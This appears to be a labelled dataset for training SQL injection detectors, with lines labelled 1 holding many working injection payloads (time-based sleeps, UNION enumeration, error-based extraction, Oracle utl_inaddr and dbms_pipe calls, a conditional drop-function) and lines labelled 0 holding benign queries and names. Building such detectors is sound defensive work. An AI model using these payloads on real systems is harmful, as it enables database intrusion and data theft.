victorico;0
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i;1
1   )    )    as uadn where 9588  =  9588 rlike sleep  (  5  )  #;1
1'   )    )    union all select null,null,null,null,null,null,null,null,null,null--;1
select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   'vjdk' like 'vjdk;1
"1"" and elt  (  4249  =  4249,7259  )  ";1
SELECT handle ( s )  FROM occur UNION;0
calle olivos de pea nevada, 124,;0
-6307' where 8916  =  8916 union all select 8916,8916,8916,8916,8916,8916,8916--;1
"1%""   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   ""%""  =  """;1
malh5jo;0
DELETE FROM growth;0
bernadet;0
"DELETE FROM inventory WHERE email = 'user123';";0
SELECT circus,properly FROM alive WHERE slowly = 'stopped' UNION SELECT hundred, children FROM sail;0
SELECT * FROM  ( SELECT sheet FROM southern ) ;0
1'  )   as mqxb where 6496  =  6496 and 7533  =  7533--;1
47361;0
SELECT mirror ( s )  FROM pictured UNION;0
1'  )   as njfg where 6392  =  6392 waitfor delay '0:0:5'--;1
DELETE FROM slowly;0
select * from users where id  =  '1' + $+%$ or 1  =  1 -- 1';1
SELECT * FROM although 3;0
mahl iglesia;0
"<>""'%;  )    (  &+";1
1'   )    )    as xntz where 5801  =  5801 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --;1
1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'zxrb'  =  'zxrb;1
"1""   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   ""knbx""  =  ""knbx";1
loudiadi;0
45591;0
SELECT * FROM particular WHERE television = 'say' LIMIT 3;0
remberta;0
1'||  (  select 'osty' from dual where 6433  =  6433 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||';1
-2823'   )    )    or 5663  =  4228 and    (    (   'skgh' like 'skgh;1
SELECT lovely, section, not FROM thou WHERE amount  IS NULL;0
SELECT * FROM operation WHERE greatest = 'strip' LIMIT 3;0
SELECT * FROM ever WHERE setting LIKE '%clean%';0
"UPDATE orders SET price = 'user123' WHERE user_id = 'user123';";0
1'  )   where 8255  =  8255 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --;1
SELECT usual, exclaimed, occurFROM higher WHERE list  IS NOT NULL;0
1'   )    )    as pdrg where 5960  =  5960 and 9198  =  9198--;1
ORDER BY 1,SLEEP(5),3,4--;1
select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1';1
"DELETE FROM sessions WHERE user_id = 'Sample text';";0
SELECT * FROM riding WHERE nuts BETWEEN '1996-07-01' AND '1996-07-31';0
SELECT * FROM negative ORDER BY lost;0
-4363%'   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  '%'  =  ';1
SELECT AVG ( think ) FROM apart;0
1'+  (  select 'plcm' where 2141  =  2141 and elt  (  3114  =  3114,sleep  (  5   )    )   #;1
1  )   union all select null,null,null,null#;1
"1""  )   where 5491  =  5491";1
1  )   as imdt where 6431  =  6431;1
1' where 8869  =  8869 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --;1
"-5210""  )   where 7176  =  7176 or 6872  =  6872--";1
SELECT joy,hunter,plastic FROM mission LEFT JOIN Orders ON child.finallyID =  corner.empty ORDER BY library.after;0
SELECT * FROM eleven WHERE own = 'air'  AND  ( series = 'wheat' OR interior = 'bowl' ) ;0
1' and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --;1
1' in boolean mode  ) ;1
1' where 4150  =  4150 and elt  (  8012  =  6026,6026  )  --;1
SELECT * FROM famous WHERE sometime BETWEEN stick09/01/1996gulf AND lesson15/31/1996near;0
FROM  ( SELECT DISTINCT friendly FROM invented ) ;0
if  (  2697  =  2008  )   select 2697 else drop function jcoo--;1
SELECT * FROM bag WHERE should = 'bar'  OR lower = 'difference';0
SELECT * FROM look FETCH FIRST 50 PERCENT ROWS ONLY;0
SELECT DISTINCT nobody FROM nice;0
SELECT AVG ( anything )  FROM pleasure  SELECT SUM ( noun ) ;0
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#;1
"1"" and make_set  (  6520  =  9958,9958  )  ";1
congostrina;0
-1908'   )    )     )   union all select 7665#;1
SELECT * FROM imagine ORDER BY practice;0
1'+  (  select basp where 6953  =  6953;1
huesca;0
1' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'jiyx'  =  'jiyx;1
SELECT * FROM rhythm WHERE strength = 'widely'  AND City = 'supply';0
SELECT * FROM term  WHERE driving NOT LIKE '[atmosphere]%';0
valimir;0
INSERT INTO double ( visitor, sure, donkey, nuts, soldier, press )  VALUES  ( 'handle', 'off'. horn', 'brave', 'thirty', 'square', 'stove' )  ;0
"-6681""  )   or 5251  =  1162";1
10702;0
1  )   as ktfu where 2637  =  2637;1
inconse_cuente;0
1'   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'tqpj'  =  'tqpj;1
-4546'  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ;1
SELECT balance, order, roadFROM hospital WHERE muscle  IS NOT NULL;0
SELECT TOP 3 * FROM being SELECT * FROM like 3SELECT * FROM trade;0
"1%"" or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""%""  =  """;1
-3411'   )    )     )   union all select 3185,3185,3185,3185,3185,3185,3185,3185--;1
torre-pacheco;0
"1""   )    )    and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   ""qyew""  =  ""qyew";1
-9145'  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  'yvfl' like 'yvfl;1
"1""  )   as vdim where 1296  =  1296";1
-7258 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #;1
"1"" where 9901  =  9901 and   (  2455  =  8499  )  *8499--";1
"UPDATE logs SET description = 'user123' WHERE email = '2023-01-01';";0
SELECT doubt ( s ) FROM copy INNER JOIN;0
37541;0
select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and '%'  =  ';1
-7485%'   )    )     )   union all select 1303,1303,1303,1303,1303,1303,1303,1303,1303--;1
SELECT * FROM feed WHERE    NOT country = 'herself';0
SELECT travel,fog FROM manner WHERE ruler = 'search' UNION SELECT bow, mud FROM easily;0
"-6747"" or 9323  =  9323#";1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18;1
1' where 7725  =  7725 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #;1
inescourt7@citycvs.mil;0
3,59E+15;0
"1""  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --";1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#;1
1%' and   (  3020  =  3020  )  *6703 and '%'  =  ';1
-3881   )    )     )   union all select 4438--;1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12;1
"1""  )   where 2445  =  2445";1
if  (  1087  =  5839  )   select 1087 else drop function zzeh--;1
-9509'   )    )     )   or 1091  =  5477 and    (    (     (  'gsmz'  =  'gsmz;1
"INSERT INTO sessions (description, created_at) VALUES ('2023-01-01', 'user123');";0
select pg_sleep  (  5  )   and '%'  =  ';1
SELECT * FROM test FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM easier;0
" select * from users where id  =  1 or ""%_"" or 1  =  1 -- 1";1
SELECT * FROM making WHERE him  BETWEEN 10 AND 20;0
humfrey;0
SELECT * FROM spread FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM himself;0
-3074'   )    )    union all select 6131,6131,6131,6131,6131,6131,6131--;1
SELECT AVG ( all )  FROM these  SELECT SUM ( jump ) ;0
SELECT * FROM let ORDER BY wave;0
SELECT * FROM sense WHERE lay = 'independent' LIMIT 3;0
"; execute immediate 'sel' || 'ect us' || 'er'";1
SELECT skin,brass,smaller FROM dug LEFT JOIN Orders ON coast.neverID =  adjective.stronger ORDER BY chicken.two;0
DELETE FROM possible WHERE kitchen = 'largest';0
iif  (  1539  =  1539,1539,1/0  )  ;1
1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  # bkjl;1
SELECT * FROM particularly WHERE unless BETWEEN 'heavy' AND 'push';0
"SELECT created_at, user_id, status FROM products WHERE quantity = 'john@example.com';";0
"1""  )   as xwnu where 6490  =  6490 union all select null,null,null,null,null,null--";1
AND 1=1--;1
SELECT * FROM day WHERE NOT powerful = 'married'  AND NOT stepped = 'plan';0
1' and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'yvxg'  =  'yvxg;1
"1"" where 2365  =  2365 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --";1
SELECT * FROM exchange  WHERE taught NOT LIKE '[laid]%';0
1  )   as kaew where 2658  =  2658;1
SELECT DISTINCT announced FROM next;0
"-7794""  )   union all select 3910,3910,3910,3910,3910,3910,3910,3910,3910,3910#";1
42569454l;0
select case when 8237  =  9948 then 1 else null end--;1
ag77avacin;0
brion6;0
SELECT * FROM earth  WHERE failed NOT LIKE '[pictured]%';0
6,43E+15;0
1'||  (  select 'bnaz' from dual where 7168  =  7168 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --;1
c/ huescar 60,;0
select * from users where id  =  1 union select  @ $,version  (    )   -- 1;1
"1""   )    )    as yuqr where 7226  =  7226 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #";1
-8357'   )    )    as henk where 8198  =  8198 or 2558  =  9103#;1
13g0e7at42a;0
SELECT * FROM individual WHERE situation NOT LIKE 'ship%';0
1' in boolean mode  )   union all select null,null,null,null,null,null--;1
1'  )   as svtm where 7627  =  7627 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --;1
SELECT * FROM met WHERE even = 'certainly'  OR property = 'consonant';0
SELECT TOP 3 * FROM made WHERE scientist = 'daughter' SELECT * FROM list;0
1'||  (  select 'zoqo' from dual where 2063  =  2063;1
SELECT COUNT ( DISTINCT share )  FROM warm;0
SELECT * FROM total WHERE during BETWEEN 'scared' AND 'faster';0
6,92E+15;0
1'   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  'nhrc' like 'nhrc;1
1'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'gcna'  =  'gcna;1
"1"" where 9461  =  9461";1
1   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   3069  =  3069;1
"-3063%""   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""%""  =  """;1
37257;0
SELECT * FROM love WHERE surface = 'desk'  AND  ( women = 'chief' OR definition = 'birds' ) ;0
"1%""   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   ""%""  =  """;1
1'||  (  select 'uebk' from dual where 6990  =  6990;1
SELECT * FROM however FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM bread;0
SELECT AVG ( several ) FROM upward SELECT SUM ( identity ) ;0
1'  )   where 2330  =  2330 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --;1
8217;0
-7307'   )    )    union all select 5215,5215,5215,5215--;1
(  case when 6398  =  6398 then 1 else null end  ) ;1
" select * from users where id  =  1 or @#""{  =  1 union select 1,version  (    )   -- 1";1
"1%""   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ""%""  =  """;1
1%'   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #;1
1 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --;1
1' in boolean mode  )   and make_set  (  8403  =  8403,8899  )  #;1
SELECT * FROM repeat;0
vilaprio;0
or ''&';1
SELECT heat FROM sang UNION ALL SELECT hour FROM sky ORDER BY promised;0
DELETE FROM catch WHERE could = 'win';0
-7714 where 9768  =  9768 union all select 9768,9768--;1
1'  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --;1
hinkie@goovitae.pg;0
1 where 4372  =  4372;1
-3304'   )    )    order by 1--;1
SELECT AVG ( official ) FROM body;0
"-6123"" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""zuzx""  =  ""zuzx";1
"1""  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --";1
"UPDATE logs SET name = '2023-01-01' WHERE created_at = 'john@example.com';";0
SELECT TOP 50 PERCENT * FROM sort SELECT * FROM wind FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM chief;0
"1%""   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""%""  =  """;1
1  )   as bidc where 5268  =  5268 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --;1
UNION ALL SELECT 1,2,3,4,5,6,7;1
ORDER BY 11;1
SELECT AVG ( let )  FROM continent  SELECT SUM ( magic ) ;0
SELECT scale AS explore, three AS [slipped]  FROM chose;0
gibezzi scampini;0
1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'mnbg' like 'mnbg;1
SELECT Orders.opportunityrID, Employees.oxygen, Employees.heard FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.findID ORDER BY Orders.windowID;0
1   )    )    as gocb where 4335  =  4335;1
SELECT sat, exact, classroom FROM clean WHERE music  IS NULL;0
select   (  case when   (  7997  =  1543  )   then 7997 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--;1
SELECT COUNT ( DISTINCT swam )  FROM produce;0
-4557%'   )    )    or 4537  =  3401 and    (    (   '%'  =  ';1
SELECT Count ( * )  AS army;0
select * from users where id  =  1 or +<$ union select 1,@@VERSION -- 1;1
SELECT * FROM cookies WHERE pack = 'share' LIMIT 3;0
SELECT include ( s )  FROM egg FULL OUTER JOIN;0
-5732'  )   union all select 7614,7614,7614,7614--;1
1 where 2674  =  2674 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --;1
SELECT Employees.knowledge, COUNT ( Orders.lifeID )  AS potatoesFROM    ( OrdersINNER JOIN carbon ON Orders.crowdID  =  Employees.sweetID ) ;0
17590r;0
"INSERT INTO orders (id, description, price, user_id) VALUES ('pending', 'active', 'Sample text', 'john@example.com');";0
"1""  )   waitfor delay '0:0:5' and   (  ""vjpg""  =  ""vjpg";1
1'  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --;1
" select * from users where id  =  1 or ""{1""  =  1 or 1  =  1 -- 1";1
"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """;1
giralda;0
1'+  (  select jley where 3581  =  3581 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #;1
"-2230%"" union all select 3303,3303,3303--";1
"SELECT name FROM inventory WHERE id = 'pending';";0
cuenca;0
" select * from users where id  =  1 or "";]"" or 1  =  1 -- 1";1
SELECT * FROM union WHERE wonderful NOT LIKE 'horse%';0
SELECT * FROM rich WHERE seven NOT LIKE 'theory%';0
sarri de ter;0
SELECT * FROM forgotten WHERE would = 'month';0
SELECT * FROM threw WHERE weigh = 'atmosphere';0
02650843r;0
"INSERT INTO users (status, user_id) VALUES (123, 'Sample text');";0
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)));1
86651591b;0
1,89E+15;0
6,59E+15;0
1' in boolean mode  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  #;1
"1%""  )   and sleep  (  5  )   and   (  ""%""  =  """;1
"1"" where 5440  =  5440 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --";1
epnimo;0
50;0
2,28E+15;0
-3956'  )   or   (  8459  =  8459  )  *4906 and   (  'rflo' like 'rflo;1
3,09E+15;0
SELECT * FROM corner WHERE happy = 'orbit'  AND  ( essential = 'draw' OR special = 'brother' ) ;0
1'   )    )    as vqrt where 5173  =  5173 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --;1
1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ;1
flo hosta;0
select   (  case when   (  2783  =  9216  )   then 1 else 2783*  (  select 2783 from master..sysdatabases  )   end  )  --;1
-4346'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #;1
cherino gebhardt;0
pasaje pedrosa 115, 6f;0
7,18E+15;0
SELECT * FROM generally WHERE plain LIKE '%alphabet%';0
oke;0
69082096d;0
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--;1
SELECT * FROM dress WHERE memory NOT BETWEEN 'knowledge' AND 'broke';0
SELECT product AS wonder, connected AS [herd]  FROM lunch;0
"UPDATE inventory SET id = 'john@example.com' WHERE status = 'user123';";0
UPDATE syllable SET regular =  'went', City =  'provide' WHERE deeply =  swung;0
SELECT * FROM atmosphere;0
SELECT hidden ( s )  FROM rest UNION;0
1   )    )    as ojjk where 3687  =  3687 and   (  4833  =  9218  )  *9218--;1
foguear;0
"1%""  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --";1
1  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ;1
UPDATE known SET weight = 'slabs'WHERE front = 'image';0
FROM  ( SELECT DISTINCT girl FROM discuss ) ;0
SELECT * FROM general ORDER BY clean ASC, supper DESC;0
-6433%'   )    )    or 9323  =  9323#;1
soubier.roudenko@mtos.is;0
SELECT * FROM honor WHERE your BETWEEN '1996-07-01' AND '1996-07-31';0
grandura;0
1 where 4944  =  4944 union all select null,null,null,null,null,null,null,null,null#;1
select   (  case when   (  6166  =  3364  )   then 6166 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--;1
-6823'   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  'lwlk' like 'lwlk;1
-2745   )    )    as aywp where 9735  =  9735 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --;1
1'  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ;1
vajil-la;0
SELECT * FROM potatoes WHERE simplest = 'felt'  AND  ( alphabet = 'skin' OR group = 'pilot' ) ;0
SELECT COUNT ( favorite ) , automobile FROM blow BY bring;0
"1%""   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  ""%""  =  """;1
1  )   union all select null#;1
sleep 50';1
26586;0
"select sleep  (  5  )   and    (    (   ""%""  =  """;1
SELECT MIN ( smile )  AS tree FROM alone;0
1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  ;1
1' in boolean mode  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  #;1
"1""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""ijag""  =  ""ijag";1
"1""   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   ""mmvu""  =  ""mmvu";1
17493;0
DELETE FROM push;0
INSERT INTO base ( wind, view, eat, characteristic, fell, familiar )  VALUES  ( 'careful', 'struck'. sick', 'circus', 'star', 'amount', 'separate' )  ;0
1'   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  'xngr'  =  'xngr;1
"SELECT user_id, status FROM orders WHERE created_at = 'active';";0
luna;0
-9120'   )    )    or 8571  =  8571--;1
SELECT * FROM just WHERE cave = 'twenty'  AND  ( baseball = 'volume' OR struggle = 'available' ) ;0
7728;0
SELECT TOP 3 * FROM food WHERE begun = 'careful' SELECT * FROM milk;0
1 where 5359  =  5359 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --;1
call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )  -- vhmc;1
"UPDATE customers SET status = 'pending' WHERE created_at = '2023-01-01';";0
"SELECT id, quantity, description, status FROM customers WHERE user_id = 'active';";0
iif  (  3447  =  1084,1,1/0  )  ;1
"-9751""   )    )     )   or 5929  =  3884--";1
-1700%' or 4149  =  3391#;1
SELECT TOP 3 * FROM between WHERE flame = 'what' SELECT * FROM newspaper;0
1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'imqi'  =  'imqi;1
select * from users where id  =  1 +   (  +  )   union select null,@@VERSION -- 1;1
c1lab8;0
mari cielo;0
1%'  )   union all select null,null,null#;1
SELECT TOP 3 * FROM activity;0
lewes;0
"1""   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #";1
SELECT pet,buried FROM ride WHERE anyone = 'wonder' UNION SELECT leaf, interest FROM bridge;0
1   )    )    union all select null,null#;1
"1""   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""vlev"" like ""vlev";1
nicforo;0
"1""  )   where 5794  =  5794 union all select null,null,null,null,null,null,null,null,null,null#";1
UPDATE quick SET planning = 'under'WHERE another = 'of';0
"1""   )    )    as rcse where 4559  =  4559 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --";1
"DELETE FROM logs WHERE quantity = 'Sample text';";0
42010181z;0
)   or   (  'x'  =  'x;1
" select * from users where id  =  1 or ""  )  1"" or 1  =  1 -- 1";1
"-5313""   )    )     )   union all select 9189,9189,9189,9189,9189,9189,9189,9189--";1
)   or true--;1
1  )   as bfuy where 3879  =  3879 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --;1
1'+  (  select ummn where 8883  =  8883 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   +';1
uhlhorn;0
